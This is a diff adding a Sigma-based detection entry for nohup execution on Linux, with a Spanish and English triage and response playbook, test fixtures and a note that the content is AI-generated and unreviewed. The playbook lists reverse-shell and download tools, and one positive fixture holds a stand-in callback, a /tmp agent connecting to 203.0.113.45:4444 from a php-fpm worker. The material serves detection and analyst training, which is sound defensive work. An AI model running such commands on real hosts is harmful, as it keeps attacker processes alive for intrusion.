@@ -1,0 +1,130 @@
+{
+  "rule": {
+    "id": "e4ffe466-6ff8-48d4-94bd-e32d1a6061e2",
+    "title": "Nohup Execution",
+    "level": "medium",
+    "status": "test",
+    "author": "Christopher Peacock @SecurePeacock, SCYTHE @scythe_io",
+    "path": "linux/process_creation/proc_creation_lnx_nohup.yml",
+    "url": "https://github.com/SigmaHQ/sigma/blob/05d1031f537e830b76da53bae2400c5814c89165/rules/linux/process_creation/proc_creation_lnx_nohup.yml",
+    "license": "DRL-1.1",
+    "techniques": [
+      "T1059.004"
+    ]
+  },
+  "playbook": {
+    "es": {
+      "summary": "Se ejecutó el binario nohup en un host Linux. Puede ser administración legítima o un intento de mantener vivo un proceso malicioso tras cerrar la sesión, o de escapar de un entorno restringido.",
+      "what_it_detects": "Eventos de creación de procesos en Linux donde Image termina en '/nohup' (por ejemplo /usr/bin/nohup), sin importar los argumentos ni el proceso padre.",
+      "why_it_matters": "nohup hace que un comando ignore SIGHUP y siga corriendo al cerrar la terminal. Un atacante puede usarlo para que reverse shells, mineros o agentes C2 persistan, o para lanzar un shell desde un entorno restringido (GTFOBins). Corresponde a ATT&CK T1059.004, Unix Shell.",
+      "triage_steps": [
+        "Revise CommandLine: identifique qué se lanza con nohup. Son sospechosos los shells (sh -c, bash -i), los binarios en /tmp, /dev/shm o /var/tmp, y las conexiones con nc, curl o wget.",
+        "Identifique el usuario y ParentImage. Un padre web (nginx, apache, php-fpm, java) o un usuario de servicio que ejecuta nohup es muy sospechoso.",
+        "Revise los procesos hijos del nohup y si siguen activos en el host (ps, árbol de procesos del EDR).",
+        "Busque conexiones de red salientes del proceso hijo en el mismo host dentro de +/- 15 minutos.",
+        "Correlacione en +/- 15 minutos con logins SSH, uso de sudo, descargas de archivos o cambios en crontab o systemd del mismo usuario.",
+        "Compare con la línea base: verifique si este host o usuario ejecuta nohup habitualmente con el mismo comando, y revise alertas anteriores de la misma entidad.",
+        "Si el comando apunta a un archivo, obtenga su hash y su ruta, y verifique su reputación y fecha de creación."
+      ],
+      "false_positives": [
+        "Administradores que lanzan tareas largas (backups, migraciones, scripts de mantenimiento) con nohup desde SSH.",
+        "Software instalado o scripts de arranque que inician servicios con nohup, como aplicaciones Java o herramientas de monitoreo.",
+        "Pipelines de CI/CD o jobs de desarrollo que ejecutan procesos en segundo plano."
+      ],
+      "response_steps": [
+        "Valide con el dueño del host o con el usuario si la ejecución era esperada y documente las excepciones legítimas recurrentes.",
+        "Si es malicioso, aísle el host de la red y preserve evidencia (lista de procesos, conexiones, binario y nohup.out) antes de terminar los procesos.",
+        "Termine los procesos maliciosos confirmados, elimine los artefactos y revise los mecanismos de persistencia (cron, systemd, .bashrc).",
+        "Rote las credenciales de la cuenta implicada y revise cómo se obtuvo el acceso inicial.",
+        "Restaure el servicio desde una fuente confiable y ajuste la regla con filtros para padres o comandos legítimos conocidos."
+      ],
+      "severity_rationale": "El nivel medio es adecuado porque nohup es una herramienta administrativa común, pero también facilita la persistencia de procesos y el escape de shells, por lo que exige contexto para decidir."
+    },
+    "en": {
+      "summary": "The nohup binary was executed on a Linux host. This may be routine administration, or an attempt to keep a malicious process alive after logout or to break out of a restricted environment.",
+      "what_it_detects": "Linux process creation events where Image ends with '/nohup' (for example /usr/bin/nohup), regardless of arguments or parent process.",
+      "why_it_matters": "nohup makes a command ignore SIGHUP, so it keeps running after the terminal closes. Attackers use it to keep reverse shells, miners or C2 agents running, or to spawn a shell from a restricted environment (GTFOBins). This maps to ATT&CK T1059.004, Unix Shell.",
+      "triage_steps": [
+        "Review CommandLine to see what nohup launches. Shells (sh -c, bash -i), binaries in /tmp, /dev/shm or /var/tmp, and nc, curl or wget connections are suspicious.",
+        "Identify the user and ParentImage. A web server parent (nginx, apache, php-fpm, java) or a service account running nohup is highly suspicious.",
+        "Check the child processes of nohup and whether they are still running (ps, EDR process tree).",
+        "Look for outbound network connections from the child process on the same host within +/- 15 minutes.",
+        "Correlate within +/- 15 minutes with SSH logins, sudo use, file downloads, or crontab or systemd changes by the same user.",
+        "Compare against the baseline: check whether this host or user routinely runs nohup with the same command, and review earlier alerts for the same entity.",
+        "If the command references a file, collect its hash and path, and check its reputation and creation time."
+      ],
+      "false_positives": [
+        "Administrators running long tasks (backups, migrations, maintenance scripts) with nohup over SSH.",
+        "Installed software or startup scripts that launch services with nohup, such as Java applications or monitoring agents.",
+        "CI/CD pipelines or development jobs that start background processes."
+      ],
+      "response_steps": [
+        "Confirm with the host owner or the user whether the execution was expected, and document recurring legitimate exceptions.",
+        "If malicious, isolate the host and preserve evidence (process list, connections, binary, nohup.out) before killing processes.",
+        "Kill the confirmed malicious processes, remove the artifacts, and check persistence mechanisms (cron, systemd, .bashrc).",
+        "Rotate the credentials of the account involved and investigate how initial access was obtained.",
+        "Restore service from a trusted source and tune the rule with filters for known legitimate parents or commands."
+      ],
+      "severity_rationale": "Medium fits because nohup is a common admin tool, but it also enables process persistence and shell escapes, so context is needed to decide."
+    }
+  },
+  "fixtures": {
+    "positive": [
+      {
+        "description": "nohup launched by a web server worker to run a binary from /tmp in the background",
+        "event": {
+          "Image": "/usr/bin/nohup",
+          "CommandLine": "nohup /tmp/.cache/agent -c 203.0.113.45:4444",
+          "ParentImage": "/usr/sbin/php-fpm8.1",
+          "ParentCommandLine": "php-fpm: pool www",
+          "User": "www-data",
+          "ProcessId": 48213,
+          "Computer": "web-03.example.com",
+          "CurrentDirectory": "/var/www/html"
+        }
+      },
+      {
+        "description": "nohup used by an admin to start a shell script that survives logout",
+        "event": {
+          "Image": "/bin/nohup",
+          "CommandLine": "nohup bash -c \"sh /home/jperez/run.sh\"",
+          "ParentImage": "/usr/bin/bash",
+          "User": "jperez",
+          "ProcessId": 9921,
+          "Computer": "bastion-01"
+        }
+      }
+    ],
+    "negative": [
+      {
+        "description": "Bash process whose command line mentions nohup, but the Image itself is bash and not nohup",
+        "event": {
+          "Image": "/usr/bin/bash",
+          "CommandLine": "bash -c \"echo nohup is installed\"",
+          "ParentImage": "/usr/sbin/sshd",
+          "User": "jperez",
+          "ProcessId": 9930,
+          "Computer": "bastion-01"
+        }
+      },
+      {
+        "description": "Wrapper script whose name starts with nohup but does not end with '/nohup'",
+        "event": {
+          "Image": "/opt/tools/nohup-wrapper",
+          "CommandLine": "/opt/tools/nohup-wrapper --job backup",
+          "ParentImage": "/usr/sbin/cron",
+          "User": "root",
+          "ProcessId": 15502,
+          "Computer": "db-02.example.com"
+        }
+      }
+    ]
+  },
+  "generated": {
+    "tool": "content-pack/1",
+    "model": "claude-opus-5-5",
+    "at": "2026-10-25T21:59:49+00:00",
+    "review": "unreviewed",
+    "notice": "AI-generated content. Review it before relying on it. Fixtures are validated by Centinela's engine in session S7."
+  }
+}
